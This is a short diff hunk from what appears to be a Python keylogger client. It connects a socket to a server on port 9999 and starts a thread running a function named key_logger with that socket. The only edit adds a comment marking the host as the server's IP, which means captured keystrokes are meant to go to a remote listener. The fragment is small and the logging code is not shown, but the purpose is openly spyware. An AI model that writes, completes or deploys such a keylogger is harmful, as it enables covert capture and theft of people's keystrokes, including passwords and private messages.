@@ -23,7 +23,7 @@ def key_logger(s):
 
 
 s=socket.socket()
-host=socket.gethostname()
+host=socket.gethostname() #server's IP
 s.connect((host,9999))
 t=threading.Thread(target=key_logger,args=(s,))
 t.start()
